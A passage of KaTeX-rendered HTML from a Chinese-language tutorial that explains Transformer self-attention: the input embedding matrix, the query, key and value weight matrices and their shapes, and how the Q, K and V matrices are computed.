mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(seq\_len, embed\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span> 的矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>。每一行 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">X[i]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span></span></span></span></span> 就对应一个词的嵌入向量 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。Transformer 的核心目标，正是将这个输入矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>，通过一系列可学习的注意力操作，转化为一个蕴含了丰富上下文信息的输出矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span>，其形状通常与 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> 保持一致。</p>
<p>为了实现可学习的注意力，我们需要引入三组独立的权重矩阵：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>、<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。它们的形状设计如下：</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的形状均为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(embed\_size, k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span></span>。</li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 的形状为 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(embed\_size, out\_size)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span></span>。</li>
</ul>
<p>这里出现了两个可调参数 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 和 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>。</p>
<ul>
<li><strong><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span></strong> 决定了输出矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi></mrow><annotation encoding="application/x-tex">Y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span></span></span></span></span> 的特征维度。在标准 Transformer 中，为了便于残差连接和层标准化等操作，通常令 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo>=</mo><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">out\_size = embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9695em;vertical-align:-0.31em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>，即保持输入输出维度一致。</li>
<li>而<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span><strong>是一个需要精心设计而非随意指定的关键超参数</strong>。它决定了注意力匹配过程的“特征分辨率”或“比较深度”。你可以将其理解为在计算注意力时，模型用于比对Query和Key的“特征专精度”。较大的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 意味着模型可以使用更丰富的特征进行精细匹配，但也可能带来过拟合风险；较小的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 则迫使模型学习更泛化、更精简的匹配模式。这个维度的选择，本质上是在<strong>模型表达力与计算效率之间寻求平衡</strong>，它如同摄影中的“对焦精度”——并非越高越好，而是要适配任务的需求。暂且搁置不谈。</li>
</ul>
<p>有了这些权重矩阵，我们便可以一次性为整个序列生成其对应的查询（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>）、键（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span>）和值（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span>）矩阵：</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>Q</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>q</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>K</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>k</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>V</mi><mo>=</mo><mi>X</mi><mo>⋅</mo><msub><mi>W</mi><mi>v</mi></msub></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>o</mi><mi>u</mi><mi>t</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{matrix}
Q = X\cdot W_{q} &amp; (seq\_len,k)
 \\
K = X\cdot W_{k} &amp; (seq\_len,k)
 \\
V = X\cdot W_{v} &amp; (seq\_len,out\_size) 
\end{matrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"/><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<p>这样一来，<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>中的每一个向量<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 便通过三个独立的线性变换被“拆分”成了<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>x</mi><mi>i</mi><mi>q</mi></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>k</mi></msubsup><mo separator="true">,</mo><msubsup><mi>x</mi><mi>i</mi><mi>v</mi></msubsup></mrow><annotation encoding="application/x-tex">x_i^q,x_i^k,x_i^v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.126em;vertical-align:-0.2769em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7823em;"><span style="top:-2.4231em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2769em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4413em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2587em;"><span/></span></span></span></span></span></span></span></span></span>，其中<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math 